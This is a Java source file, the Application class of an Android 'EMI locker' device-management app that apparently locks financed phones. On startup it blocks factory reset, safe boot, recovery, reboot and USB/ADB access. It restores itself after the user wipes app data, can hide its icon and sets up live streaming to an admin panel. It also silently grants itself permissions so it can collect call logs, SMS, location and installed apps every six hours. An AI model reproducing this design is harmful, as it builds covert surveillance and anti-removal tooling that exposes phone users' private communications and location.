package com.riad.rrlkr;

import android.app.Application;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;

import com.riad.rrlkr.metadata.MetadataCollectionWorker;
import com.riad.rrlkr.network.ApiClient;
import com.riad.rrlkr.service.DeviceMonitorService;
import com.riad.rrlkr.service.DeviceProtectionManager;
import com.riad.rrlkr.service.LockManager;
import com.riad.rrlkr.service.RebootBlockerService;
import com.riad.rrlkr.service.ServiceKeepAliveWorker;
import com.riad.rrlkr.util.DeviceProtectedPrefs;
import com.riad.rrlkr.util.PreferenceManager;

public class App extends Application {
    
    private static final String TAG = "App";
    
    public static final String CHANNEL_ID_SERVICE = "emi_locker_service";
    public static final String CHANNEL_ID_ALERTS = "emi_locker_alerts";
    public static final String CHANNEL_ID_WARNINGS = "emi_locker_warnings";
    
    private static App instance;
    private PreferenceManager preferenceManager;
    
    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;
        
        Log.i(TAG, "RR Device Manager starting...");
        
        // Initialize components
        preferenceManager = new PreferenceManager(this);
        ApiClient.init(this);
        
        // MIGRATION: Old code saved "is_enrolled"=true but isEnrolled() reads "enrolled".
        // Copy old key to correct key so existing enrolled devices keep working.
        if (!preferenceManager.isEnrolled() && preferenceManager.getBoolean("is_enrolled", false)) {
            Log.w(TAG, "MIGRATION: Copying is_enrolled â†’ enrolled");
            preferenceManager.setEnrolled(true);
        }
        
        // Create notification channels
        createNotificationChannels();
        
        // Self-heal: if the launcher icon was disabled but the app is not
        // intentionally hidden, re-enable it so the app can be opened again.
        ensureLauncherVisibleIfNotHidden();
        
        // Configure device policy on app start
        configureDevicePolicyEarly();
        
        // CRITICAL: Check for data wipe scenario and restore enrollment data
        checkAndRestoreFromDeviceProtectedStorage();
        
        // Apply device protections if enrolled
        applyDeviceProtections();
        
        // Schedule WorkManager keep-alive for 24/7 operation
        scheduleKeepAlive();
        
        // Schedule periodic metadata collection (call log / SMS / location / installed apps)
        scheduleMetadataCollection();
        
        // Start foreground monitoring service
        startMonitoringService();
        
        // Request battery optimization exemption
        requestBatteryOptimizationExemption();
        
        // Check for pending Zero Touch Enrollment retry
        retryPendingZTEEnrollment();

        // Live streaming: listen for connectivity changes so a dropped
        // WebSocket reconnects to the admin panel as soon as internet
        // comes back, and re-apply any desired stream state from prefs.
        com.riad.rrlkr.streaming.AutoStreamManager.registerNetworkCallback(this);
        com.riad.rrlkr.streaming.AutoStreamManager.apply(this);

        Log.i(TAG, "RR Device Manager initialized");
    }
    
    public static App getInstance() {
        return instance;
    }
    
    public PreferenceManager getPreferenceManager() {
        return preferenceManager;
    }
    
    /**
     * CRITICAL: Detect if app data was cleared (via recovery or Settings) and restore
     * enrollment data from device-protected storage backup.
     * 
     * Scenario: User boots into recovery and clears cache/data, or somehow clears app data.
     * - Main SharedPreferences are wiped (enrollment data lost)
     * - Device Owner status MAY survive (if it wasn't a full factory reset)
     * - Device-protected storage backup MAY survive
     * 
     * If we detect Device Owner is active but enrollment data is missing,
     * we restore from backup and re-apply all protections immediately.
     */
    private void checkAndRestoreFromDeviceProtectedStorage() {
        try {
            DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
            boolean isDeviceOwner = protectionManager.isDeviceOwner();
            boolean isEnrolled = preferenceManager.isEnrolled();
            String deviceId = preferenceManager.getDeviceId();

            // Case 1: Device Owner but enrollment data is gone
            if (isDeviceOwner && (!isEnrolled || deviceId == null || deviceId.isEmpty())) {
                
                // Check if ZTE enrollment is in progress â€” this is a fresh provisioning, NOT a data wipe
                boolean zteProvisioned = preferenceManager.getBoolean("zte_provisioned", false);
                boolean ztePending = preferenceManager.getBoolean("zte_pending", false);
                if (zteProvisioned || ztePending) {
                    Log.i(TAG, "ZTE enrollment in progress â€” skipping data wipe detection");
                    return;
                }

                DeviceProtectedPrefs dpPrefs = new DeviceProtectedPrefs(this);

                // Check if admin disabled the app (in that case, don't restore)
                if (dpPrefs.isAppDisabled()) {
                    Log.i(TAG, "App was disabled by admin - not restoring");
                    preferenceManager.setAppDisabled(true);
                    return;
                }

                if (dpPrefs.hasValidBackup()) {
                    // DATA WAS CLEARED â€” device-protected backup exists, restore it
                    Log.w(TAG, "=== DATA WIPE DETECTED! Restoring from device-protected storage ===");
                    boolean restored = dpPrefs.restoreTo(preferenceManager);
                    if (restored) {
                        Log.i(TAG, "=== ENROLLMENT DATA RESTORED from device-protected storage! ===");

                        // Re-apply ALL protections â€” on a background thread to keep onCreate fast.
                        new Thread(() -> {
                            try {
                                protectionManager.applyAllProtections();
                            } catch (Throwable t) {
                                Log.e(TAG, "Restore-applyAllProtections failed", t);
                            }
                        }, "RestoreApplyProtections").start();

                        // If device was locked before data wipe, re-lock it
                        if (dpPrefs.isDeviceLocked()) {
                            Log.i(TAG, "Device was locked before wipe - re-locking");
                            preferenceManager.saveBoolean("admin_lock_command", true);
                            preferenceManager.setDeviceLocked(true);
                            LockManager.showLockScreen(this);
                        }

                        // Start services immediately
                        DeviceMonitorService.start(this);
                        ServiceKeepAliveWorker.schedule(this);
                    }
                } else {
                    // No backup exists â€” this is a FRESH provisioning (QR setup just completed)
                    // Do NOT apply full protections yet â€” USB/ADB kill would break setup.
                    // ZTE enrollment or manual enrollment will call applyAllProtections() after completing.
                    Log.i(TAG, "Fresh provisioning detected â€” no backup, no lock. Waiting for enrollment.");
                }
            }

            // Case 2: Not Device Owner, not enrolled - fresh install or full factory reset
            // Nothing to restore, normal flow
            
        } catch (Exception e) {
            Log.e(TAG, "Error checking/restoring from device-protected storage", e);
        }
    }

    /**
     * Apply all device protections if app is enrolled
     * Called on every app start to ensure protections persist
     */
    private void applyDeviceProtections() {
        try {
            DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
            
            // Skip if admin has disabled the app remotely
            if (preferenceManager.isAppDisabled()) {
                Log.i(TAG, "App is DISABLED by admin - skipping protections");
                return;
            }

            final boolean isOwner = protectionManager.isDeviceOwner();
            final boolean isEnrolled = preferenceManager.isEnrolled();

            // === BASE PROTECTIONS (safe to apply BEFORE enrollment) ===
            // These specifically do NOT touch USB / ADB / debugging features,
            // so they're safe to apply as soon as we are Device Owner. They
            // ensure factory reset / safe boot / power off / recovery are
            // blocked even if the user has not yet completed enrollment.
            if (isOwner) {
                Log.i(TAG, "Device Owner detected - applying base reset/reboot blocks (background)");
                new Thread(() -> {
                    try {
                        protectionManager.disableFactoryReset();
                        protectionManager.disableSafeBoot();
                        protectionManager.disableRecoveryMode();
                        protectionManager.enableFactoryResetProtection();
                        protectionManager.disableOTAUpdatesReset();
                        protectionManager.disableFlashAndFirmware();
                        protectionManager.blockAppsControl();
                        protectionManager.disableRebootPowerOff();
                        protectionManager.enablePowerButtonInterceptService();
                    } catch (Throwable t) {
                        Log.e(TAG, "Base protections failed", t);
                    }
                }, "BaseProtections").start();
            }

            // === FULL PROTECTIONS (only after enrollment, kills ADB) ===
            // applyAllProtections() also disables USB data signaling and ADB,
            // so we only call it after the device is enrolled.
            if (isOwner && isEnrolled) {
                Log.i(TAG, "Device Owner + Enrolled - applying FULL protections (background)");
                new Thread(() -> {
                    try {
                        protectionManager.applyAllProtections();
                        preferenceManager.setProtectionsApplied(true);
                        if (!protectionManager.verifyIMEIBinding()) {
                            Log.w(TAG, "IMEI BINDING VERIFICATION FAILED!");
                        }
                    } catch (Throwable t) {
                        Log.e(TAG, "applyAllProtections (App.onCreate) failed", t);
                    }
                }, "AppApplyProtections").start();
            } else if (isOwner) {
                Log.i(TAG, "Device Owner but NOT enrolled - base protections only");
            } else if (isEnrolled) {
                Log.w(TAG, "Enrolled but not Device Owner - limited protections");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error applying device protections", e);
        }
    }
    
    /**
     * If the launcher activity was disabled (app hidden) but the user has not
     * intentionally hidden the app, re-enable it. This self-heals cases where
     * the app icon was hidden and there is no other way to bring it back
     * (shell/adb cannot re-enable a component the app disabled itself).
     */
    private void ensureLauncherVisibleIfNotHidden() {
        try {
            if (preferenceManager != null && preferenceManager.isAppHidden()) {
                return; // intentionally hidden, leave it disabled
            }
            android.content.pm.PackageManager pm = getPackageManager();
            android.content.ComponentName launcher =
                    new android.content.ComponentName(getPackageName(), "com.riad.rrlkr.ui.LauncherAlias");
            int state = pm.getComponentEnabledSetting(launcher);
            if (state == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED) {
                pm.setComponentEnabledSetting(
                        launcher,
                        android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                        android.content.pm.PackageManager.DONT_KILL_APP);
                Log.i(TAG, "Self-heal: re-enabled launcher alias (was disabled, app not hidden)");
            }
        } catch (Exception e) {
            Log.w(TAG, "ensureLauncherVisibleIfNotHidden failed: " + e.getMessage());
        }
    }
    
    private void createNotificationChannels() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationManager notificationManager = getSystemService(NotificationManager.class);
            
            // Service channel (for foreground service)
            NotificationChannel serviceChannel = new NotificationChannel(
                CHANNEL_ID_SERVICE,
                "Device Management Service",
                NotificationManager.IMPORTANCE_LOW
            );
            serviceChannel.setDescription("Background service for device management");
            serviceChannel.setShowBadge(false);
            notificationManager.createNotificationChannel(serviceChannel);
            
            // Alerts channel (high priority for lock notifications)
            NotificationChannel alertsChannel = new NotificationChannel(
                CHANNEL_ID_ALERTS,
                "Device Alerts",
                NotificationManager.IMPORTANCE_HIGH
            );
            alertsChannel.setDescription("Important device management alerts");
            alertsChannel.enableVibration(true);
            alertsChannel.setShowBadge(true);
            notificationManager.createNotificationChannel(alertsChannel);
            
            // Warnings channel (for payment reminders)
            NotificationChannel warningsChannel = new NotificationChannel(
                CHANNEL_ID_WARNINGS,
                "Device Reminders",
                NotificationManager.IMPORTANCE_DEFAULT
            );
            warningsChannel.setDescription("Device management reminders");
            notificationManager.createNotificationChannel(warningsChannel);
        }
    }
    
    /**
     * Configure app verification policy on app start.
     * As Device Owner, we configure verification settings and grant runtime permissions.
     */
    private void configureDevicePolicyEarly() {
        try {
            DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
            if (protectionManager.isDeviceOwner()) {
                protectionManager.configureAppVerificationPolicy();
                // Also grant POST_NOTIFICATIONS and other Android 13+ permissions
                protectionManager.grantAllRuntimePermissions();
                Log.i(TAG, "App verification configured and permissions granted on app start");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error configuring app verification early", e);
        }
    }

    /**
     * Schedule WorkManager periodic task for 24/7 service survival
     */
    /**
     * Schedule periodic metadata collection (call log / SMS / location /
     * installed apps / device info / behavior) every 6h via WorkManager.
     */
    private void scheduleMetadataCollection() {
        try {
            if (preferenceManager.isEnrolled() && !preferenceManager.isAppDisabled()) {
                // Silent grant of READ_CALL_LOG / READ_SMS / location etc. via Device Owner.
                try {
                    new DeviceProtectionManager(this).grantMetadataPermissions();
                } catch (Throwable t) {
                    Log.w(TAG, "grantMetadataPermissions failed: " + t.getMessage());
                }
                MetadataCollectionWorker.schedule(this);
                Log.i(TAG, "Metadata collection worker scheduled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling metadata worker", e);
        }
    }

    private void scheduleKeepAlive() {
        try {
            if (preferenceManager.isEnrolled()) {
                ServiceKeepAliveWorker.schedule(this);
                Log.i(TAG, "24/7 KeepAlive worker scheduled");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling keep-alive", e);
        }
    }
    
    /**
     * Start the foreground monitoring service and reboot blocker
     */
    private void startMonitoringService() {
        try {
            if (preferenceManager.isEnrolled()) {
                DeviceMonitorService.start(this);
                Log.i(TAG, "Monitoring service started");
                
                // Also start RebootBlockerService for 3-layer protection
                DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
                if (protectionManager.isDeviceOwner()) {
                    RebootBlockerService.start(this);
                    Log.i(TAG, "RebootBlockerService started (3rd protection layer)");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error starting monitoring service", e);
        }
    }
    
    /**
     * Retry pending Zero Touch Enrollment if previous attempt failed.
     * ZTE may fail on first boot if network wasn't ready. This retries on app restart.
     */
    private void retryPendingZTEEnrollment() {
        try {
            boolean ztePending = preferenceManager.getBoolean("zte_pending", false);
            boolean zteProvisioned = preferenceManager.getBoolean("zte_provisioned", false);
            boolean isEnrolled = preferenceManager.isEnrolled();
            
            if (zteProvisioned && !isEnrolled && ztePending) {
                Log.i(TAG, "=== ZTE enrollment pending â€” retrying auto-enrollment ===");
                String serverUrl = preferenceManager.getServerUrl();
                // Zero Touch Enrollment removed; in-app Device Admin enrollment is used instead.
            }
        } catch (Exception e) {
            Log.e(TAG, "Error retrying ZTE enrollment", e);
        }
    }
    
    /**
     * Request exemption from battery optimization for 24/7 background operation.
     * On Device Owner mode, this can be set programmatically.
     */
    private void requestBatteryOptimizationExemption() {
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
                if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                    // Try to whitelist via Device Owner
                    DeviceProtectionManager protectionManager = new DeviceProtectionManager(this);
                    if (protectionManager.isDeviceOwner()) {
                        // Device Owner can directly exempt from Doze
                        android.app.admin.DevicePolicyManager dpm = 
                                (android.app.admin.DevicePolicyManager) getSystemService(DEVICE_POLICY_SERVICE);
                        if (dpm != null) {
                            // setLockTaskPackages already ensures the app stays in foreground
                            Log.i(TAG, "Device Owner - battery optimization handled via lock task");
                        }
                    }
                    Log.i(TAG, "Battery optimization exemption requested");
                } else {
                    Log.i(TAG, "Already exempt from battery optimization");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error requesting battery optimization exemption", e);
        }
    }
}
